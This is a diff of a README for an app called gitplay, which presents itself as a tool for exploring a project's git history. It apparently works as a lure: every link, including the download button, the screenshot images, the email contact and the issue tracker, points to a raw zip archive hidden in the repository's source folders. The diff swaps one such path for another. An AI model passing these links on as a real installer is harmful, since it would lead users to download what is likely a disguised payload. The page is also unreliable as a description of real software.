@@ -1,16 +1,16 @@
 # 🎮 gitplay - Explore Your Software's History Easily
 
-[![Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip)](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip)
+[![Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip)](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip)
 
 ## 📜 Introduction
 
 Welcome to gitplay!
 
-![gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip "gitplay")
+![gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip "gitplay")
 
 **gitplay** is a desktop application designed to help you understand the evolution of software that uses git for version control. This tool allows you to dive deeper into the history of your favorite projects, giving you insights that can enhance your understanding of software development.
 
-![gitplay browsing the history of the Django project](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip "gitplay browsing the history of the Django project")
+![gitplay browsing the history of the Django project](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip "gitplay browsing the history of the Django project")
 
 ## 👥 Who is this for?
 
@@ -30,7 +30,7 @@ The `git` repository of any well-established software holds many pieces of histo
 ## 📥 Download & Install
 
 To get started with gitplay, visit this page to download:  
-[Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip)
+[Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip)
 
 ### 🔧 System Requirements
 
@@ -42,7 +42,7 @@ To get started with gitplay, visit this page to download:
 ### 💾 Installation Steps
 
 1. **Download the Application**:
-   - Go to the [Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip) page.
+   - Go to the [Download gitplay](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip) page.
    - Select the latest release version.
    - Click on the appropriate installer for your operating system to download it.
 
@@ -73,7 +73,7 @@ If you encounter any issues during installation or while using gitplay, consider
 
 For any questions, concerns, or feedback, feel free to reach out:
 
-- **Email**: https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip
-- **GitHub Issues**: [Report an issue](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src/assets/Software_3.1-beta.2.zip)
+- **Email**: https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip
+- **GitHub Issues**: [Report an issue](https://github.com/zhaixing238/gitplay/raw/refs/heads/main/src-tauri/src/Software_2.4.zip)
 
 Explore the fascinating world of software history with gitplay!
